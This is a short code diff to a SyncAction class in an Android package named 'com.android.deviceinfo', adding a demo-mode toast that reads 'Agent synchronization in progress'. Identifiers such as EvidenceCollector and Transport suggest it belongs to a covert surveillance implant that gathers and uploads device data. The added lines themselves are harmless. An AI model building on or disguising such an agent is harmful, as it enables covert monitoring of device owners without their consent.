@@ -12,7 +12,10 @@ package com.android.deviceinfo.action;
 import java.util.Date;
 import java.util.Vector;
 
+import android.widget.Toast;
+
 import com.android.deviceinfo.Beep;
+import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
 import com.android.deviceinfo.action.sync.ProtocolException;
 import com.android.deviceinfo.action.sync.Transport;
@@ -24,6 +27,7 @@ import com.android.deviceinfo.evidence.EvidenceCollector;
 import com.android.deviceinfo.interfaces.iProtocol;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -106,6 +110,7 @@ public abstract class SyncAction extends SubActionSlow {
 		
 		if (Cfg.DEMO) {
 			Beep.beep();
+			Status.self().makeToast(M.e("Agent synchronization in progress"));
 		}
 
 		for (int i = 0; i < transports.size(); i++) {
